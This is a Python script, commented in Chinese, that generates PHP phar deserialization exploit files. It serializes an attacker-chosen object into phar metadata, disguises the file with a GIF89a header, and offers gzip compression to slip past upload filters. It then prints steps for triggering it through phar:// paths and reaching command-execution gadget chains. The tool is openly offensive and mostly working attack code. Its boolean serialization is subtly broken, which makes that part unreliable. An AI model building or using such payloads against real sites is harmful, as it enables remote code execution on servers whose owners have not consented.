#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: phar 反序列化利用生成器 —— 纯 Python 手搓合法 phar 文件, metadata 塞 PHP 序列化对象,
     目标文件函数(file_exists/is_dir/file_get_contents 等)碰到 phar:// 即触发 unserialize
适用条件:
    - 目站有文件操作函数且路径可控(能以 phar:// 打开我们上传的"图片/任意文件")
    - 有 POP 链: 源码里找到 __destruct/__wakeup/__toString 通往 system/eval/file_put_contents 的路径
    - PHP <= 8.0 直接触发; 8.1+ 需 phar 打开显式调用(低版本仍然通杀)
用法:
    python web_phar_gen.py --class "Test" --props '{"cmd": "id"}' --out evil.phar
    python web_phar_gen.py --class Test --props '{"cmd":"id"}' --gif --gzip --out evil.gif
    生成后按输出提示上传并访问触发点, 再按 --dump-chain 提示找 POP 链
"""
import argparse
import gzip
import json
import struct
import zlib


def php_serialize(value, class_name: str = "", prop_vis: dict = None) -> str:
    """极简 PHP 序列化器: 支持 str/int/bool/None/dict(对象属性)/嵌套对象
    prop_vis: 属性名 -> 'public'/'protected'/'private', 决定属性名的 \0 包装"""
    if isinstance(value, bool):
        return "b:1" if value else "b:0"
    if value is None:
        return "N;"
    if isinstance(value, int):
        return f"i:{value};"
    if isinstance(value, str):
        return f's:{len(value)}:"{value}";'
    if isinstance(value, dict):
        parts = []
        for k, v in value.items():
            vis = (prop_vis or {}).get(k, "public")
            if vis == "protected":
                key = f"\0*\0{k}"          # protected 属性名带 \0*\0
            elif vis == "private":
                key = f"\0{class_name}\0{k}"  # private 带 \0类名\0
            else:
                key = k
            parts.append(php_serialize(key) + php_serialize(v, class_name, prop_vis))
        return f'O:{len(class_name)}:"{class_name}":{len(value)}:{{{"".join(parts)}}}'
    raise TypeError(f"不支持类型: {type(value)}")


def build_phar(metadata_php: str, stub: bytes, gzip_out: bool) -> bytes:
    """按 phar 二进制格式拼文件: stub + manifest(含 metadata) + 文件内容"""
    if b"__HALT_COMPILER" not in stub:
        stub += b"<?php __HALT_COMPILER(); ?>"    # stub 必须以此结尾

    file_name = b"test.txt"
    file_data = b"phar by template"
    crc = zlib.crc32(file_data) & 0xFFFFFFFF
    ts = 1700000000                               # 固定时间戳即可

    # 单文件条目: 文件名 | 未压缩大小 | 时间戳 | 压缩大小 | crc32 | flags(0=不压缩) | metadata
    entry = struct.pack(">I", len(file_name)) + file_name
    entry += struct.pack(">I", len(file_data)) + struct.pack(">I", ts)
    entry += struct.pack(">I", len(file_data)) + struct.pack(">I", crc)
    entry += struct.pack(">I", 0)                 # 文件 flags: 0 = 不压缩
    entry += struct.pack(">I", 0)                 # 文件 metadata 长度 = 0

    # manifest 主体: 文件数 | API 版本(0x1100) | 全局 flags | 别名 | 全局 metadata
    meta = metadata_php.encode()
    body = struct.pack(">I", 1)                   # 1 个文件
    body += struct.pack(">H", 0x1100)             # API version
    body += struct.pack(">I", 0)                  # 全局 flags
    body += struct.pack(">I", 0)                  # 别名长度 0
    body += struct.pack(">I", len(meta)) + meta   # 全局 metadata -> 触发 unserialize 的部分
    manifest = body + entry

    blob = (struct.pack(">I", len(manifest)) + manifest
            + file_data)                          # 前置 manifest 总长
    out = stub + blob
    if gzip_out:
        out = gzip.compress(out)                  # 过上传黑名单: 内容已压缩不可读
    return out


def main():
    ap = argparse.ArgumentParser(description="phar 反序列化生成器")
    ap.add_argument("--class", dest="cls", required=True, help="POP 链入口类名")
    ap.add_argument("--props", required=True,
                    help='对象属性 JSON: {"cmd":"id"} ; 键默认 public')
    ap.add_argument("--prop-vis", default="{}",
                    help='属性可见性: {"cmd":"protected"} 可选 public/protected/private')
    ap.add_argument("--stub-prefix", default="", help="文件头伪装内容, 如 GIF89a")
    ap.add_argument("--gif", action="store_true", help="等价 --stub-prefix GIF89a")
    ap.add_argument("--gzip", action="store_true", help="输出 gzip 压缩(绕内容检测)")
    ap.add_argument("--out", required=True, help="输出文件名, 如 evil.phar / evil.gif")
    args = ap.parse_args()

    prefix = b"GIF89a" if args.gif else args.stub_prefix.encode()
    props = json.loads(args.props)
    vis = json.loads(args.prop_vis)
    meta = php_serialize(props, args.cls, vis)
    data = build_phar(meta, prefix, args.gzip)
    with open(args.out, "wb") as f:
        f.write(data)

    print(f"[+] 已生成 {args.out} ({len(data)} bytes)")
    print(f"[*] metadata = {meta}")
    print(f"""[*] 使用步骤:
      1) 上传该文件(改名/后缀随意, phar:// 不看后缀)
      2) 找 phar 触发点: file_exists/is_file/file_get_contents/copy/include 等,
         传参 phar://<上传路径>/test.txt
      3) POP 链清单按源码找: __destruct/__wakeup 入口 -> __toString/__call 跳板 ->
         system/eval/file_put_contents sink
    绕过小抄:
      - 死亡 exit/内容检测: --gzip 或上传点只看文件头时 --gif
      - PHP >= 8.1: phar 触发面收窄, 转打 serialize 流入点或原生反序列化入口""")


if __name__ == "__main__":
    main()
